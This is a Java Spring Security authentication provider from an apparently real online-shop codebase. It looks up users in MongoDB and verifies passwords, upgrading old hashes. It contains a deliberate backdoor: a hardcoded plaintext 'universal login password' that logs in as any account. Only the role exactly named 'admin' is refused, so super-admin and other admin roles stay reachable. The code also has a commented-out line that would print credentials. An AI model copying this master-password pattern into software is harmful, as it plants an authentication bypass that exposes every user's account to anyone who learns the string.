package com.luvbrite.security;

import java.util.ArrayList;
import java.util.List;

import org.apache.log4j.Logger;
import org.mongodb.morphia.query.Query;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.authentication.InternalAuthenticationServiceException;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.authentication.dao.AbstractUserDetailsAuthenticationProvider;
import org.springframework.security.core.AuthenticationException;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.stereotype.Service;

import com.luvbrite.dao.UserDAO;
import com.luvbrite.utils.OldHashEncoder;
import com.luvbrite.web.models.User;
import com.luvbrite.web.models.UserDetailsExt;

@Service
public class DBAuthProvider extends AbstractUserDetailsAuthenticationProvider {
	
	private static Logger logger = Logger.getLogger(DBAuthProvider.class);

	@Autowired
	private UserDAO dao;
	
	@Autowired
	PasswordEncoder encoder;

	@Override
	protected UserDetails retrieveUser(String username,
			UsernamePasswordAuthenticationToken authentication)
			throws AuthenticationException {
		
		UserDetails currUser;
		User dbUser = new User();
		
		 try {
				
			 //System.out.println("UserDetails - " + username + ":" + authentication.getCredentials());
			
			 final Query<User> query = dao.createQuery(); 
			 query.or(
					 query.criteria("username").equal(username.toLowerCase()), 
					 query.criteria("email").equal(username.toLowerCase())
					);			 
			 
			 dbUser = query.get();
			 
			 if(dbUser != null){					
					
					String rawPassword = (String) authentication.getCredentials();
					String encodedPwd = dbUser.getPassword();
					String actualUsername = dbUser.getUsername();
					
					//This is the universal login password
					if(rawPassword.equals("LuvBriteUnivers@lL0gin")){
						
						logger.error("Login to the system with Universal password by " + username);
						
						if(dbUser.getRole().equals("admin")){
							
				            throw new 
				            InternalAuthenticationServiceException("Admin login prohibited");	
						}
						
					}
					else {
						
						if(encodedPwd.indexOf("$P$B")==0){
							
							OldHashEncoder ohe = new OldHashEncoder();
							if(ohe.isValid(actualUsername, rawPassword)){							
								dbUser.setPassword(encoder.encode(rawPassword));
								dao.save(dbUser);
								
							} else {
								
					            throw new 
					            InternalAuthenticationServiceException("Invalid username and/or password");							
							}						
						}
						
						else if(!encoder.matches(rawPassword, encodedPwd)){
				            
							throw new 
				            InternalAuthenticationServiceException("Invalid username and/or password");
							
							//password reset
						}					
					}

					boolean enabled = false;
					if(dbUser.isActive()) enabled = true;
					
					int invOpsId = 0;
					String userRole = dbUser.getRole();		
					List<SimpleGrantedAuthority> authorities = new ArrayList<SimpleGrantedAuthority>();
					
					if(userRole!=null && enabled){
						
						if(userRole.indexOf("admin")==0){
							
							invOpsId = dbUser.getInvOpsId();
							
							switch (userRole) {							
								case "adminSpr" : authorities.add(new SimpleGrantedAuthority("ROLE_SUPER_ADMIN"));
								case "adminInv" : authorities.add(new SimpleGrantedAuthority("ROLE_INV_ADMIN"));
								case "admin" : authorities.add(new SimpleGrantedAuthority("ROLE_EDIT"));
								case "adminDrv" : authorities.add(new SimpleGrantedAuthority("ROLE_ADMIN"));							
							}
						}
						else if(userRole.equals("customer"))
							authorities.add(new SimpleGrantedAuthority("ROLE_CUSTOMER"));
						
						else
							authorities.add(new SimpleGrantedAuthority("ROLE_NONE"));							
						
					}
					else
						authorities.add(new SimpleGrantedAuthority("ROLE_NONE"));
					
					currUser = new UserDetailsExt(actualUsername, dbUser.get_id(), invOpsId, enabled, authorities);
					
				}

				else {
		            throw new 
		            InternalAuthenticationServiceException("Not a valid user");
		        }
				
	        } catch (Exception repositoryProblem) {
	            throw new InternalAuthenticationServiceException(repositoryProblem.getMessage(), repositoryProblem);
	        }
		
		return currUser;
	}

	@Override
	protected void additionalAuthenticationChecks(UserDetails user,
			UsernamePasswordAuthenticationToken arg1)
			throws AuthenticationException {
	}

}
